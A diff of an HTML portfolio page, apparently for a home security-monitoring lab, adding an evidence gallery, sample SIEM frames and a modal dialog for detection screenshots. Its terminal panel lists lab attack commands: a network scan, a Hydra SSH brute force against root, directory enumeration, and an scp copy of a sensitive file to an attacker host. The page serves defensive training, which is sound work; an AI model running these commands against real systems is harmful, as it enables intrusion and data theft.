@@ -868,63 +868,258 @@
     </div>
   </section>
 
-  <section>
-    <div class="container">
-      <div class="highlight-grid">
-        <div class="panel">
-          <h3>Repository Walkthrough Timeline</h3>
-          <div class="timeline">
-            <div class="step">
-              <div class="step-num">1</div>
-              <div><h3>Scope the Lab</h3><p>Start with project scope, lab inventory, and architecture so the lab has a clear enterprise story.</p></div>
-            </div>
-            <div class="step">
-              <div class="step-num">2</div>
-              <div><h3>Build the Infrastructure</h3><p>Deploy Windows Server, Windows client, Ubuntu, Kali, Security Onion, and Wazuh in a repeatable order.</p></div>
-            </div>
-            <div class="step">
-              <div class="step-num">3</div>
-              <div><h3>Implement Detections</h3><p>Add Wazuh rules, Sysmon coverage, and Security Onion hunts that support your selected attack stories.</p></div>
-            </div>
-            <div class="step">
-              <div class="step-num">4</div>
-              <div><h3>Run Simulations and Cases</h3><p>Execute controlled attacks, collect screenshots, investigate alerts, and write incident reports.</p></div>
-            </div>
+<section>
+  <div class="container">
+    <div class="highlight-grid">
+      <div class="panel">
+        <h3>Repository Walkthrough Timeline</h3>
+        <div class="timeline">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div><h3>Scope the Lab</h3><p>Start with project scope, lab inventory, and architecture so the lab has a clear enterprise story.</p></div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div><h3>Build the Infrastructure</h3><p>Deploy Windows Server, Windows client, Ubuntu, Kali, Security Onion, and Wazuh in a repeatable order.</p></div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div><h3>Implement Detections</h3><p>Add Wazuh rules, Sysmon coverage, and Security Onion hunts that support your selected attack stories.</p></div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div><h3>Run Simulations and Cases</h3><p>Execute controlled attacks, collect screenshots, investigate alerts, and write incident reports.</p></div>
           </div>
         </div>
 
-        <div class="panel">
-          <h3>Terminal Highlights</h3>
-          <p>This panel gives the site the lab-operation feel you wanted and can later be replaced with a real walkthrough video of the repository, attack flow, and alert evidence.</p>
-          <div class="terminal">
-            <div><span class="prompt">$</span> <span class="cmd">nmap -sS -T4 192.168.20.0/24</span></div>
-            <div><span class="prompt">$</span> <span class="cmd">hydra -l root -P rockyou.txt ssh://192.168.20.10</span></div>
-            <div><span class="prompt">$</span> <span class="cmd">gobuster dir -u http://192.168.20.20 -w common.txt</span></div>
-            <div><span class="prompt">$</span> <span class="cmd">scp sensitivefile attacker@kali:/tmp</span></div>
+        <div class="frame-grid">
+          <div class="sample-frame">
+            <div class="sample-frame-head">
+              <span>docs/04-threat-model.md</span>
+              <div class="sample-dots"><span></span><span></span><span></span></div>
+            </div>
+            <div class="sample-frame-body">
+              Threat priorities, monitored assets, initial access assumptions, and top ATT&amp;CK techniques for the lab.
+              <div class="sample-bars" style="margin-top:12px;">
+                <span></span><span></span><span></span><span></span>
+              </div>
+            </div>
+          </div>
+
+          <div class="sample-frame">
+            <div class="sample-frame-head">
+              <span>reports/01-incident-report-template.md</span>
+              <div class="sample-dots"><span></span><span></span><span></span></div>
+            </div>
+            <div class="sample-frame-body">
+              Severity, source IP, affected host, evidence screenshots, ATT&amp;CK mapping, and containment notes.
+              <div class="sample-bars" style="margin-top:12px;">
+                <span></span><span></span><span></span><span></span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="panel">
+        <h3>Terminal Highlights</h3>
+        <p>This panel gives the site the lab-operation feel you wanted and can later be replaced with a real walkthrough video of the repository, attack flow, and alert evidence.</p>
+        <div class="terminal">
+          <div><span class="prompt">$</span> <span class="cmd">nmap -sS -T4 192.168.20.0/24</span></div>
+          <div><span class="prompt">$</span> <span class="cmd">hydra -l root -P rockyou.txt ssh://192.168.20.10</span></div>
+          <div><span class="prompt">$</span> <span class="cmd">gobuster dir -u http://192.168.20.20 -w common.txt</span></div>
+          <div><span class="prompt">$</span> <span class="cmd">scp sensitivefile attacker@kali:/tmp</span></div>
+        </div>
+
+        <div class="frame-grid">
+          <div class="sample-frame">
+            <div class="sample-frame-head">
+              <span>Sample SIEM frame</span>
+              <div class="sample-dots"><span></span><span></span><span></span></div>
+            </div>
+            <div class="sample-frame-body">
+              Alert: Multiple failed authentications detected from 192.168.20.50 against Linux SSH service.
+              <div class="sample-bars" style="margin-top:12px;">
+                <span></span><span></span><span></span><span></span>
+              </div>
+            </div>
+          </div>
+
+          <div class="sample-frame">
+            <div class="sample-frame-head">
+              <span>Sample evidence frame</span>
+              <div class="sample-dots"><span></span><span></span><span></span></div>
+            </div>
+            <div class="sample-frame-body">
+              Event ID 4625 burst, matching failed-login sequence, mapped to brute force behavior for analyst review.
+              <div class="sample-bars" style="margin-top:12px;">
+                <span></span><span></span><span></span><span></span>
+              </div>
+            </div>
           </div>
         </div>
       </div>
     </div>
-  </section>
+  </div>
+</section>
 
-  <section id="evidence">
-    <div class="container">
-      <div class="section-head">
-        <h2>Evidence Gallery</h2>
-        <p>These placeholders are designed to match your screenshot checklist and execution checklist so the website stays aligned with the rest of the repository.</p>
+<section id="evidence">
+  <div class="container">
+    <div class="section-head">
+      <h2>Evidence Gallery</h2>
+      <p>These placeholders are designed to match your screenshot checklist and execution checklist so the website stays aligned with the rest of the repository.</p>
+    </div>
+
+    <div class="frame-grid" style="margin-bottom:16px;">
+      <div class="sample-frame">
+        <div class="sample-frame-head">
+          <span>Sample architecture frame</span>
+          <div class="sample-dots"><span></span><span></span><span></span></div>
+        </div>
+        <div class="sample-frame-body">
+          Use this frame for a clean topology preview showing attacker, Windows Server, Windows client, Ubuntu, Security Onion, and Wazuh.
+          <div class="sample-bars" style="margin-top:12px;">
+            <span></span><span></span><span></span><span></span>
+          </div>
+        </div>
       </div>
-      <div class="gallery">
-        <div class="shot">Architecture Diagram</div>
-        <div class="shot">Wazuh Dashboard Overview</div>
-        <div class="shot">Security Onion Alerts</div>
-        <div class="shot">Suricata Nmap Detection</div>
-        <div class="shot">Linux auth.log Brute Force</div>
-        <div class="shot">Windows Event ID 4625</div>
-        <div class="shot">MITRE ATT&amp;CK Mapping</div>
-        <div class="shot">Incident Report Summary</div>
+
+      <div class="sample-frame">
+        <div class="sample-frame-head">
+          <span>Sample incident frame</span>
+          <div class="sample-dots"><span></span><span></span><span></span></div>
+        </div>
+        <div class="sample-frame-body">
+          Use this frame for a SIEM alert preview, analyst note, or short incident summary that helps flesh out the page visually.
+          <div class="sample-bars" style="margin-top:12px;">
+            <span></span><span></span><span></span><span></span>
+          </div>
+        </div>
       </div>
     </div>
-  </section>
+
+    <div class="gallery">
+      <div class="shot modal-card" tabindex="0"
+           data-title="Architecture Diagram"
+           data-labels="architecture/, diagrams/, topology"
+           data-description="Sample architecture preview modal showing how your network zones, monitored hosts, and detection stack can be presented inside the website."
+           data-details="Show attacker, server, client, Ubuntu, Security Onion, and Wazuh relationships|Add IP ranges and arrows for telemetry flow|Use this as the visual anchor for the entire project.">
+        <span class="shot-label">Architecture Diagram</span>
+      </div>
+
+      <div class="shot modal-card" tabindex="0"
+           data-title="Wazuh Dashboard Overview"
+           data-labels="wazuh, siem, alerts"
+           data-description="Sample dashboard preview with room for alert counts, severity distribution, and recent detections across monitored hosts."
+           data-details="Highlight authentication anomalies and host coverage|Show alert severity and recent activity|Use one clean screenshot with visible filters and timestamps.">
+        <span class="shot-label">Wazuh Dashboard Overview</span>
+      </div>
+
+      <div class="shot modal-card" tabindex="0"
+           data-title="Security Onion Alerts"
+           data-labels="security onion, suricata, zeek"
+           data-description="Sample modal for network detections captured through Security Onion during simulations or hunts."
+           data-details="Show alert title, source IP, destination IP, and protocol|Pair with one short case explanation|Use this to support reconnaissance and traffic investigation stories.">
+        <span class="shot-label">Security Onion Alerts</span>
+      </div>
+
+      <div class="shot modal-card" tabindex="0"
+           data-title="Suricata Nmap Detection"
+           data-labels="suricata, t1046, reconnaissance"
+           data-description="Sample modal for an Nmap detection story tied to ATT&amp;CK technique T1046 and network service discovery."
+           data-details="Show rule name and timestamp|Add attacker IP and target range|Link this frame to your reconnaissance simulation file.">
+        <span class="shot-label">Suricata Nmap Detection</span>
+      </div>
+
+      <div class="shot modal-card" tabindex="0"
+           data-title="Linux auth.log Brute Force"
+           data-labels="linux, auth.log, t1110"
+           data-description="Sample log evidence frame for repeated failed SSH logins and source-IP correlation inside the SIEM workflow."
+           data-details="Show 3–5 repeated failed password entries|Pair with Hydra command evidence|Use this as the strongest Linux investigation screenshot.">
+        <span class="shot-label">Linux auth.log Brute Force</span>
+      </div>
+
+      <div class="shot modal-card" tabindex="0"
+           data-title="Windows Event ID 4625"
+           data-labels="windows, event 4625, authentication"
+           data-description="Sample modal for Windows failed logon evidence pulled from Event Viewer or centralized collection."
+           data-details="Show host name, account, and source network context|Use Sysmon or Wazuh correlation nearby|Tie it to your Windows logon case file.">
+        <span class="shot-label">Windows Event ID 4625</span>
+      </div>
+
+      <div class="shot modal-card" tabindex="0"
+           data-title="MITRE ATT&amp;CK Mapping"
+           data-labels="mitre, coverage, reporting"
+           data-description="Sample modal for technique mapping that connects your simulations, detections, and investigation reports to ATT&amp;CK."
+           data-details="Show T1046, T1110, T1021, and T1059 mappings|Use this in reports and detection strategy|Keep the layout clean and readable.">
+        <span class="shot-label">MITRE ATT&amp;CK Mapping</span>
+      </div>
+
+      <div class="shot modal-card" tabindex="0"
+           data-title="Incident Report Summary"
+           data-labels="report, evidence, conclusion"
+           data-description="Sample incident-summary modal with severity, evidence links, analyst conclusion, and suggested next steps."
+           data-details="Add alert source and affected asset|Embed screenshot references and ATT&amp;CK mapping|Use this frame to demonstrate analyst communication quality.">
+        <span class="shot-label">Incident Report Summary</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="modal" id="cardModal" aria-hidden="true" role="dialog" aria-modal="true" data-close="true">
+  <div class="modal-dialog">
+    <div class="modal-hero"></div>
+    <div class="modal-content">
+      <div class="modal-top">
+        <div>
+          <h2 id="modalTitle" style="margin:0;">Preview</h2>
+          <div class="modal-meta" id="modalMeta"></div>
+        </div>
+        <button class="modal-close" id="modalClose" type="button" data-close="true" aria-label="Close preview">✕</button>
+      </div>
+
+      <div class="modal-layout">
+        <div>
+          <p id="modalDescription">Sample evidence description appears here.</p>
+
+          <div class="frame-grid" style="margin-top:16px;">
+            <div class="sample-frame">
+              <div class="sample-frame-head">
+                <span>Preview frame</span>
+                <div class="sample-dots"><span></span><span></span><span></span></div>
+              </div>
+              <div class="sample-frame-body">
+                Replace this area with a real screenshot, cropped dashboard image, terminal capture, or investigation view from the repository website.
+                <div class="sample-bars" style="margin-top:12px;">
+                  <span></span><span></span><span></span><span></span>
+                </div>
+              </div>
+            </div>
+
+            <div class="sample-frame">
+              <div class="sample-frame-head">
+                <span>Command / analyst note</span>
+                <div class="sample-dots"><span></span><span></span><span></span></div>
+              </div>
+              <div class="sample-frame-body">
+                Use the second frame for the related command, SIEM note, MITRE tag, or the short analyst explanation that supports the preview.
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <aside class="modal-side">
+          <h4>Highlights</h4>
+          <ul id="modalList">
+            <li>Sample detail</li>
+            <li>Another supporting point</li>
+            <li>Use this area for evidence notes.</li>
+          </ul>
+        </aside>
+      </div>
+    </div>
+  </div>
+</div>
 
   <div class="modal" id="cardModal" aria-hidden="true">
     <div class="modal-backdrop" data-close="true"></div>
